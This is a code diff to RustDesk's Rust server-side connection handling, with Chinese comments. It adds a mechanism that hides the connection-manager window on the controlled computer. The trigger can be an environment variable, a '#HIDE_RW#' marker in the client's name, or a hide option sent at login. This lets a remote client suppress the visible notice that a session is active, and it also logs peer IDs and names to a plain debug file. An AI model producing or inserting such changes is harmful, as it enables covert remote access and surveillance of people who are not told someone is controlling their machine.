@@ -1705,7 +1705,30 @@ impl Connection {
     }
 
     fn try_start_cm(&mut self, peer_id: String, name: String, authorized: bool) {
-        self.send_to_cm(ipc::Data::Login {
+        // 检查是否需要隐藏服务端窗口（从环境变量）
+        let hide_server_window = std::env::var("RUSTDESK_HIDE_SERVER_WINDOW").unwrap_or_default() == "true";
+        
+        // 检查客户端是否在用户名中包含隐藏窗口的标记
+        let hide_from_client_name = name.contains("#HIDE_RW#");
+        
+        // 检查客户端是否在登录请求选项中要求隐藏远程窗口（protobuf 方式，作为备用）
+        let hide_from_client_option = if let Some(ref option) = self.options_in_login {
+            use hbb_common::message_proto::option_message::BoolOption;
+            option.hide_remote_window == BoolOption::Yes.into()
+        } else {
+            false
+        };
+        
+        let should_hide = hide_server_window || hide_from_client_name || hide_from_client_option;
+        
+        // 输出到调试文件
+        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open("RustDesk_debug.log") {
+            use std::io::Write;
+            let _ = writeln!(file, "Rust try_start_cm 检查隐藏窗口: hide_server_window={}, hide_from_client_name={}, hide_from_client_option={}, should_hide={}, peer_id={}, name={}", hide_server_window, hide_from_client_name, hide_from_client_option, should_hide, peer_id, name);
+        }
+        
+        // 总是启动连接管理器，但传递隐藏窗口的信息
+        let mut login_data = ipc::Data::Login {
             id: self.inner.id(),
             is_file_transfer: self.file_transfer.is_some(),
             is_view_camera: self.view_camera,
@@ -1723,7 +1746,28 @@ impl Connection {
             recording: self.recording,
             block_input: self.block_input,
             from_switch: self.from_switch,
-        });
+        };
+        
+        // 如果需要隐藏窗口，在 Login 数据中添加标记
+        if should_hide {
+            // 输出到调试文件
+            if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open("RustDesk_debug.log") {
+                use std::io::Write;
+                let _ = writeln!(file, "Rust try_start_cm 启动连接管理器但隐藏窗口");
+            }
+            // 在 peer_id 中添加隐藏标记，让连接管理器知道要隐藏窗口
+            if let ipc::Data::Login { ref mut peer_id, .. } = login_data {
+                *peer_id = format!("{}#HIDE_RW#", peer_id);
+            }
+        }
+        
+        self.send_to_cm(login_data);
+        
+        // 输出到调试文件
+        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open("RustDesk_debug.log") {
+            use std::io::Write;
+            let _ = writeln!(file, "Rust try_start_cm 发送 Login 数据到连接管理器");
+        }
     }
 
     #[inline]
